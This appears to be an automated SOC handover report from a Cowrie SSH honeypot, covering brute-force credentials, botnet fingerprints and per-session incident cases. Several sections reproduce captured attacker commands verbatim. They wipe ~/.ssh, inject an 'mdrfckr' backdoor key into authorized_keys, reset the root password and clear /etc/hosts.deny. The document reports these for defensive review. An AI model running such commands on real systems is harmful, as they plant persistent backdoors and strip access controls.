# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-09 |
| **Generated At** | 2026-06-09T21:50:55Z |
| **Shift Time** | 21:50 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **970** |
| Confirmed Threats | **958** |
| False Positives Filtered | **12** (1.2%) |
| Unique Attacker IPs | **40** |
| Countries of Origin | **18** |
| High Severity Cases | **68** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **902** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **166** |
| Unique Credential Pairs | **101** |
| Unique Usernames | **61** |
| Unique Passwords | **89** |
| Successful Auth Pairs | **48** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 68 |
| `345gs5662d34` | 30 |
| `ubuntu` | 5 |
| `ftpuser` | 2 |
| `oracle` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 30 |
| `3245gs5662d34` | 30 |
| `123456` | 6 |
| `1234` | 5 |
| `123` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 30 |
| `root` | `3245gs5662d34` | 30 |
| `root` | `@qwer2025` | 2 |
| `root` | `1Qaz2wsx!` | 2 |
| `admin` | `1234` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `nokia` | `20.12.41.6` | 2026-06-09T18:12:42 |
| `root` | `3245gs5662d34` | `20.12.41.6` | 2026-06-09T18:12:47 |
| `root` | `@qwer2025` | `148.66.132.204` | 2026-06-09T18:13:41 |
| `root` | `3245gs5662d34` | `148.66.132.204` | 2026-06-09T18:13:44 |
| `root` | `qwerty111` | `20.12.41.6` | 2026-06-09T18:14:29 |
| `root` | `1qaz!QAZ1qaz` | `148.66.132.204` | 2026-06-09T18:15:45 |
| `root` | `a123456`` | `20.12.41.6` | 2026-06-09T18:16:12 |
| `root` | `2wsxCDE#4rfv` | `148.66.132.204` | 2026-06-09T18:20:04 |
| `root` | `1984` | `20.12.41.6` | 2026-06-09T18:50:42 |
| `root` | `Qwer112233` | `20.12.41.6` | 2026-06-09T18:56:53 |
| `root` | `Password+1` | `20.12.41.6` | 2026-06-09T19:06:59 |
| `root` | `Q11111111` | `138.124.99.219` | 2026-06-09T19:13:57 |
| `root` | `3245gs5662d34` | `138.124.99.219` | 2026-06-09T19:14:04 |
| `root` | `Amazonaws@2026` | `14.103.148.217` | 2026-06-09T19:18:56 |
| `root` | `gd@123456` | `138.124.99.219` | 2026-06-09T19:27:48 |
| `root` | `admin_2025` | `138.124.99.219` | 2026-06-09T19:32:22 |
| `root` | `!QAZ2wsx3` | `201.63.223.140` | 2026-06-09T19:32:26 |
| `root` | `3245gs5662d34` | `201.63.223.140` | 2026-06-09T19:32:34 |
| `root` | `A123456.` | `36.93.249.106` | 2026-06-09T19:36:14 |
| `root` | `3245gs5662d34` | `36.93.249.106` | 2026-06-09T19:36:17 |
| `root` | `Qwerty123` | `138.124.99.219` | 2026-06-09T19:36:57 |
| `root` | `1Qaz2wsx!` | `46.6.124.216` | 2026-06-09T19:41:27 |
| `root` | `Password00` | `138.124.99.219` | 2026-06-09T19:41:32 |
| `root` | `ghbdtn` | `45.196.236.141` | 2026-06-09T19:48:37 |
| `root` | `3245gs5662d34` | `45.196.236.141` | 2026-06-09T19:48:41 |
| `root` | `Hello*123` | `138.124.158.150` | 2026-06-09T19:59:37 |
| `root` | `3245gs5662d34` | `138.124.158.150` | 2026-06-09T19:59:43 |
| `root` | `Admin!` | `138.124.158.150` | 2026-06-09T20:01:46 |
| `root` | `ubuntu18svm` | `103.89.136.111` | 2026-06-09T20:06:20 |
| `root` | `3245gs5662d34` | `103.89.136.111` | 2026-06-09T20:06:21 |
| `root` | `Lb123456` | `138.124.158.150` | 2026-06-09T20:07:51 |
| `root` | `Yz123456@` | `101.126.82.218` | 2026-06-09T20:07:57 |
| `root` | `Hello*123` | `103.89.136.111` | 2026-06-09T20:08:53 |
| `root` | `123456aa` | `101.126.82.218` | 2026-06-09T20:10:21 |
| `root` | `angelo123` | `121.229.191.90` | 2026-06-09T20:14:28 |
| `root` | `1Qaz2wsx!` | `121.229.191.90` | 2026-06-09T20:17:02 |
| `root` | `qwe123!@#` | `101.126.82.218` | 2026-06-09T20:17:07 |
| `root` | `syncmaster` | `101.126.82.218` | 2026-06-09T20:17:49 |
| `root` | `3245gs5662d34` | `101.126.82.218` | 2026-06-09T20:17:55 |
| `root` | `root2026!` | `43.164.190.40` | 2026-06-09T20:27:25 |
| `root` | `3245gs5662d34` | `43.164.190.40` | 2026-06-09T20:27:29 |
| `root` | `1234567@` | `43.164.190.40` | 2026-06-09T20:33:51 |
| `root` | `123321456` | `43.164.190.40` | 2026-06-09T20:35:51 |
| `root` | `QWE123456@` | `43.164.190.40` | 2026-06-09T20:37:54 |
| `root` | `@qwer2025` | `43.164.190.40` | 2026-06-09T20:46:25 |
| `root` | `joao` | `43.164.190.40` | 2026-06-09T20:50:32 |
| `root` | `qweasd123.` | `43.164.190.40` | 2026-06-09T20:54:37 |
| `root` | `gettherefast` | `103.89.136.111` | 2026-06-09T21:12:18 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **970** |
| Sessions with Fingerprint | **8** |
| Unique HASSH Fingerprints | **8** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 217 |
| OpenSSH | 3 |
| AsyncSSH (Python) | 1 |
| Go SSH scanner | 1 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 151 | 15 |
| `03a80b21afa8...` | Modern SSH client | 59 | 3 |
| `bc9e7273cde2...` | Mirai/variant | 2 | 2 |
| `acaa53e0a7d7...` | Mirai/variant | 1 | 1 |
| `f0dae8afad40...` | Modern SSH client | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 151 | 15 | Mirai/variant |
| `03a80b21afa8...` | libssh | 59 | 3 | Modern SSH client |
| `95420f9d932d...` | libssh | 7 | 2 | — |
| `bc9e7273cde2...` | OpenSSH | 2 | 2 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 1 | 1 | Mirai/variant |
| `f0dae8afad40...` | AsyncSSH (Python) | 1 | 1 | Modern SSH client |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `e54ef3ec27fe...` | Unknown | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 7 | 4 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 30 | 10 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:UNOiZo1pYZwN"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `121.229.191.90`, `46.6.124.216`, `101.126.82.218`, `138.124.99.219`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `36.93.249.106`, `103.89.136.111`, `43.164.190.40`, `20.12.41.6`, `201.63.223.140`, `148.66.132.204`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **40** |
| Unique ASNs | **29** |
| High-Risk ASNs | **25** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS396982` | Google LLC | 4 | LOW |
| `AS14061` | DigitalOcean, LLC | 3 | HIGH |
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS46562` | Performive LLC | 2 | LOW |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS25369` | Hydra Communications Ltd | 2 | HIGH |
| `AS22773` | Cox Communications Inc. | 2 | LOW |
| `AS134756` | CHINANET Nanjing Jishan IDC network | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (67)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-d883ad979862

| Field | Detail |
|---|---|
| **Source IP** | `20.12.41[.]6` |
| **First Seen** | 2026-06-09 18:12 |
| **Last Seen** | 2026-06-09 18:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 18:12:41` | `cowrie.session.connect` |
| `2026-06-09 18:12:41` | `cowrie.client.version` |
| `2026-06-09 18:12:41` | `cowrie.client.kex` |
| `2026-06-09 18:12:42` | `cowrie.login.success` |
| `2026-06-09 18:12:43` | `cowrie.session.params` |
| `2026-06-09 18:12:43` | `cowrie.command.input` |
| `2026-06-09 18:12:43` | `cowrie.command.failed` |
| `2026-06-09 18:12:43` | `cowrie.log.closed` |
| `2026-06-09 18:12:43` | `cowrie.session.params` |
| `2026-06-09 18:12:43` | `cowrie.command.input` |
| `2026-06-09 18:12:44` | `cowrie.session.file_download` |
| `2026-06-09 18:12:44` | `cowrie.log.closed` |
| `2026-06-09 18:12:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.12.41[.]6` to AbuseIPDB if not already reported
- [ ] Block `20.12.41[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1739cc13eb6

| Field | Detail |
|---|---|
| **Source IP** | `20.12.41[.]6` |
| **First Seen** | 2026-06-09 18:12 |
| **Last Seen** | 2026-06-09 18:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 18:12:46` | `cowrie.session.connect` |
| `2026-06-09 18:12:46` | `cowrie.client.version` |
| `2026-06-09 18:12:46` | `cowrie.client.kex` |
| `2026-06-09 18:12:47` | `cowrie.login.success` |
| `2026-06-09 18:12:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.12.41[.]6` to AbuseIPDB if not already reported
- [ ] Block `20.12.41[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-454396c94d94

| Field | Detail |
|---|---|
| **Source IP** | `148.66.132[.]204` |
| **First Seen** | 2026-06-09 18:13 |
| **Last Seen** | 2026-06-09 18:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 18:13:41` | `cowrie.session.connect` |
| `2026-06-09 18:13:41` | `cowrie.client.version` |
| `2026-06-09 18:13:41` | `cowrie.client.kex` |
| `2026-06-09 18:13:41` | `cowrie.login.success` |
| `2026-06-09 18:13:42` | `cowrie.session.params` |
| `2026-06-09 18:13:42` | `cowrie.command.input` |
| `2026-06-09 18:13:42` | `cowrie.command.failed` |
| `2026-06-09 18:13:42` | `cowrie.log.closed` |
| `2026-06-09 18:13:42` | `cowrie.session.params` |
| `2026-06-09 18:13:42` | `cowrie.command.input` |
| `2026-06-09 18:13:42` | `cowrie.session.file_download` |
| `2026-06-09 18:13:42` | `cowrie.log.closed` |
| `2026-06-09 18:13:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.66.132[.]204` to AbuseIPDB if not already reported
- [ ] Block `148.66.132[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72c3fd1bb7bf

| Field | Detail |
|---|---|
| **Source IP** | `148.66.132[.]204` |
| **First Seen** | 2026-06-09 18:13 |
| **Last Seen** | 2026-06-09 18:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 18:13:43` | `cowrie.session.connect` |
| `2026-06-09 18:13:43` | `cowrie.client.version` |
| `2026-06-09 18:13:44` | `cowrie.client.kex` |
| `2026-06-09 18:13:44` | `cowrie.login.success` |
| `2026-06-09 18:13:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.66.132[.]204` to AbuseIPDB if not already reported
- [ ] Block `148.66.132[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6db4c946bc57

| Field | Detail |
|---|---|
| **Source IP** | `20.12.41[.]6` |
| **First Seen** | 2026-06-09 18:14 |
| **Last Seen** | 2026-06-09 18:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 18:14:28` | `cowrie.session.connect` |
| `2026-06-09 18:14:28` | `cowrie.client.version` |
| `2026-06-09 18:14:28` | `cowrie.client.kex` |
| `2026-06-09 18:14:29` | `cowrie.login.success` |
| `2026-06-09 18:14:29` | `cowrie.session.params` |
| `2026-06-09 18:14:29` | `cowrie.command.input` |
| `2026-06-09 18:14:29` | `cowrie.command.failed` |
| `2026-06-09 18:14:29` | `cowrie.log.closed` |
| `2026-06-09 18:14:30` | `cowrie.session.params` |
| `2026-06-09 18:14:30` | `cowrie.command.input` |
| `2026-06-09 18:14:30` | `cowrie.session.file_download` |
| `2026-06-09 18:14:30` | `cowrie.log.closed` |
| `2026-06-09 18:14:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.12.41[.]6` to AbuseIPDB if not already reported
- [ ] Block `20.12.41[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-502c1c656699

| Field | Detail |
|---|---|
| **Source IP** | `20.12.41[.]6` |
| **First Seen** | 2026-06-09 18:14 |
| **Last Seen** | 2026-06-09 18:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 18:14:32` | `cowrie.session.connect` |
| `2026-06-09 18:14:32` | `cowrie.client.version` |
| `2026-06-09 18:14:33` | `cowrie.client.kex` |
| `2026-06-09 18:14:34` | `cowrie.login.success` |
| `2026-06-09 18:14:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.12.41[.]6` to AbuseIPDB if not already reported
- [ ] Block `20.12.41[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0217cbda6b1d

| Field | Detail |
|---|---|
| **Source IP** | `148.66.132[.]204` |
| **First Seen** | 2026-06-09 18:15 |
| **Last Seen** | 2026-06-09 18:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 18:15:45` | `cowrie.session.connect` |
| `2026-06-09 18:15:45` | `cowrie.client.version` |
| `2026-06-09 18:15:45` | `cowrie.client.kex` |
| `2026-06-09 18:15:45` | `cowrie.login.success` |
| `2026-06-09 18:15:46` | `cowrie.session.params` |
| `2026-06-09 18:15:46` | `cowrie.command.input` |
| `2026-06-09 18:15:46` | `cowrie.command.failed` |
| `2026-06-09 18:15:46` | `cowrie.log.closed` |
| `2026-06-09 18:15:46` | `cowrie.session.params` |
| `2026-06-09 18:15:46` | `cowrie.command.input` |
| `2026-06-09 18:15:46` | `cowrie.session.file_download` |
| `2026-06-09 18:15:46` | `cowrie.log.closed` |
| `2026-06-09 18:15:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.66.132[.]204` to AbuseIPDB if not already reported
- [ ] Block `148.66.132[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9acfc670538

| Field | Detail |
|---|---|
| **Source IP** | `148.66.132[.]204` |
| **First Seen** | 2026-06-09 18:15 |
| **Last Seen** | 2026-06-09 18:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 18:15:47` | `cowrie.session.connect` |
| `2026-06-09 18:15:47` | `cowrie.client.version` |
| `2026-06-09 18:15:47` | `cowrie.client.kex` |
| `2026-06-09 18:15:48` | `cowrie.login.success` |
| `2026-06-09 18:15:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.66.132[.]204` to AbuseIPDB if not already reported
- [ ] Block `148.66.132[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8de7aae3a26e

| Field | Detail |
|---|---|
| **Source IP** | `20.12.41[.]6` |
| **First Seen** | 2026-06-09 18:16 |
| **Last Seen** | 2026-06-09 18:16 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 18:16:11` | `cowrie.session.connect` |
| `2026-06-09 18:16:11` | `cowrie.client.version` |
| `2026-06-09 18:16:11` | `cowrie.client.kex` |
| `2026-06-09 18:16:12` | `cowrie.login.success` |
| `2026-06-09 18:16:12` | `cowrie.session.params` |
| `2026-06-09 18:16:12` | `cowrie.command.input` |
| `2026-06-09 18:16:12` | `cowrie.command.failed` |
| `2026-06-09 18:16:13` | `cowrie.log.closed` |
| `2026-06-09 18:16:13` | `cowrie.session.params` |
| `2026-06-09 18:16:13` | `cowrie.command.input` |
| `2026-06-09 18:16:13` | `cowrie.session.file_download` |
| `2026-06-09 18:16:13` | `cowrie.log.closed` |
| `2026-06-09 18:16:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.12.41[.]6` to AbuseIPDB if not already reported
- [ ] Block `20.12.41[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3a75c912052

| Field | Detail |
|---|---|
| **Source IP** | `20.12.41[.]6` |
| **First Seen** | 2026-06-09 18:16 |
| **Last Seen** | 2026-06-09 18:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 18:16:16` | `cowrie.session.connect` |
| `2026-06-09 18:16:16` | `cowrie.client.version` |
| `2026-06-09 18:16:16` | `cowrie.client.kex` |
| `2026-06-09 18:16:17` | `cowrie.login.success` |
| `2026-06-09 18:16:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.12.41[.]6` to AbuseIPDB if not already reported
- [ ] Block `20.12.41[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c1801e504d6

| Field | Detail |
|---|---|
| **Source IP** | `148.66.132[.]204` |
| **First Seen** | 2026-06-09 18:20 |
| **Last Seen** | 2026-06-09 18:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
